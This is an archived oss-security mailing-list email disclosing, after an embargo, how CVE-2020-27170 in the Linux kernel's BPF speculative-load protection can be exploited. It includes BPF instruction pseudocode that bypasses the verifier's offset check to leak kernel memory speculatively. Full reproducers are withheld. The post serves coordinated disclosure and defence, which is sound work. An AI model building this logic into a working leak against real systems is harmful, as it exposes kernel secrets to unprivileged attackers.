X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1580" "Wednesday" "24" "March" "2021" "19:34:50" "+0000" "Piotr Krysiuk" "piotras@gmail.com" nil "39" "[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory" nil nil nil "3" nil nil (number mark "U       piotras@gmai Mar 24   39/1580  " thread-indent "\"[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3134 invoked by uid 550); 24 Mar 2021 19:38:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32477 invoked from network); 24 Mar 2021 19:35:13 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=4c3uLqxmCsRVNi9Z3i4lBTFAGZWyEr4nyJTqDy+hPDg=;
        b=VIF0m8a0aNL1MZ8DNruBYbNuFX1fCc7jrHKRts6icpGO38McT7hwExG5D1FE7/eLJZ
         7usuZqxM4429ljx+Kb4XgPui9yx7f1bV3f4b4FaqMZOwztpP9FRHzaMsHv259FM7Ibbj
         uF6trDF3KrRiSd3JGol7sFenZO5PBWx1x8KC2yheqPbdqpH0aV6hR2t9pmSGi7xbU5SX
         EQ0m++QAEYPcOH/euF0GlcxEED+c1JEPkXMWBMRnTd2iBsoJbw4dJL06xlrf7pdrm7e0
         zcQYOtv9duETHg4g5ooah1fvzTQaiNN4hn6FZId3pRuqxvB/gmYANa2JXboRzG1Y2ojp
         q16A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=4c3uLqxmCsRVNi9Z3i4lBTFAGZWyEr4nyJTqDy+hPDg=;
        b=a09x76yPwO/fd0bm2CIUd5zLfvpfrm9/+zByDBRqQKUZoZarM3D0fiqos4mmR+NTEk
         QZ4/2JGH5ghJn4ylRd1dQdPPnZEOBJO0euBBmWPJclSvhMzZJgIsk420fO/QtoHeX0Y6
         5podPkEIfRJqh1FdPm0rMM4qile72VZJOg/eRvMha22sNvyW0kPWCxlHJUaYooVWtQyw
         mNR9XM8dYaCHJuvybwn/8if/Ha0MNomLF+VVuEpXvvpCnaEs699W6wtl1AmUR6hi0T7F
         34RcBt1qft0gTHbjtC0UmssEZphniPJcPlKfSAS83B8eC72DnmgsXShEvUcidq54Km2r
         tAwQ==
X-Gm-Message-State: AOAM530ODn337DjcFKtv+27644xFqQvxjHyUD1wpyDUf4MxM3c6I6FWR
	ms1TcWVRgjR85LZmcOs//vbF0KuAWRejdalheDraj+RyIBFKVg==
X-Google-Smtp-Source: ABdhPJyLYU4qgVn1x8XkdKgcwVxxsxSd/PB4vX4Gx5KfgzQ8X/s1o3TJfDJ2csjrIR85KrZW8ugTh9sa1jQoEek8hjE=
X-Received: by 2002:a5d:4281:: with SMTP id k1mr5119532wrq.374.1616614501666;
 Wed, 24 Mar 2021 12:35:01 -0700 (PDT)
MIME-Version: 1.0
References: <CAFzhf4pJm_SLYd_tE69gspYvXm0VRvxhEi6c2JFL4cx_5=wwQg@mail.gmail.com>
In-Reply-To: <CAFzhf4pJm_SLYd_tE69gspYvXm0VRvxhEi6c2JFL4cx_5=wwQg@mail.gmail.com>
From: Piotr Krysiuk <piotras@gmail.com>
Date: Wed, 24 Mar 2021 19:34:50 +0000
Message-ID: <CAFzhf4rREUjn4=Z45GBxvo4CAvf5=xPEiu3O0rpnWF3hR-7AxQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds
 loads in the Linux kernel can be bypassed by unprivileged local users to leak
 content of kernel memory

Some details of how CVE-2020-27170 could be exploited in practice were
provided via linux-distros mailing list with 7 days embargo. This was
intended to help any affected Linux distributions to assess the risk
and decide about any appropriate actions.

As the embargo expires today, I was asked to share these details
publically on oss-security.

The CVE-2020-27170 vulnerability has been successfully reproduced
against Linux kernel v5.12-rc3 using the following logic for BPF
program attached to a socket:

    load bpf_context pointer (BPF_REG_1) into BPF_REG_CTX,
    load pointer to our big array into BPF_REG_MAP_PTR,
    load offset of data to leak into BPF_REG_OFFSET,

    // load any slowly-loaded value...
    BPF_LDX_MEM(BPF_DW, BPF_REG_SLOW_CHECK, BPF_REG_MAP_PTR, 0x1200),

    // ... and turn it into known zero for verifier,
    // while preserving slowly-loaded dependency for affected hardware
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 2),

    // speculatively bypassed offset check
    BPF_JMP_REG(BPF_JNE, BPF_REG_OFFSET, BPF_REG_SLOW_CHECK,
                skip_speculation),

    // speculatively unbounded pointer arithmetic
    BPF_ALU64_REG(BPF_ADD, BPF_REG_CTX, BPF_REG_OFFSET),

    // speculatively unbounded load
    BPF_LDX_MEM(BPF_W, BPF_REG_LEAKED_WORD, BPF_REG_CTX,
                offsetof(struct __sk_buff, protocol)),

    transmit speculatively loaded BPF_REG_LEAKED_WORD via side-channel,

The full reproducers were shared with a number of Linux distributions
for protection purposes.
